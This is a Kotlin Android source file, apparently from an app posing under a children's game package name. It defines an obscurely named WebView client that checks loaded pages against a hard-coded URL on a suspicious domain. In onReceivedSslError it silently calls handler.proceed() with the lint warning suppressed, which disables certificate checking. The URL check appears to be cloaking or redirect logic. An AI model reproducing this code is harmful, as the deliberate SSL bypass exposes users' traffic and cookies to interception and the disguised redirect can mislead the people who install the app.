package com.tocaboca.tocacar.presentation.core

import android.annotation.SuppressLint
import android.net.http.SslError
import android.webkit.CookieManager
import android.webkit.SslErrorHandler
import android.webkit.WebView
import android.webkit.WebViewClient

class ViewWrapper(
    private val onMatch: () -> Unit,
    private val onUnmatched: (String) -> Unit,
) {

    private inner class LocalView : WebViewClient() {
        override fun onPageFinished(view: WebView, name: String) {
            super.onPageFinished(view, name)
            CookieManager.getInstance().flush()

            if (name == MAIN) {
                onMatch()
            } else {
                onUnmatched(name)
            }
        }

        @SuppressLint("WebViewClientOnReceivedSslError")
        override fun onReceivedSslError(
            view: WebView,
            handler: SslErrorHandler,
            error: SslError,
        ) {
            handler.proceed()
        }
    }

    companion object {
        const val MAIN = "https://neoncard.sbs/nxkdgj.php"

        fun getInstance(onMatch: () -> Unit, onUnmatched: (String) -> Unit): WebViewClient {
            return ViewWrapper(onMatch = onMatch, onUnmatched = onUnmatched).LocalView()
        }

    }
}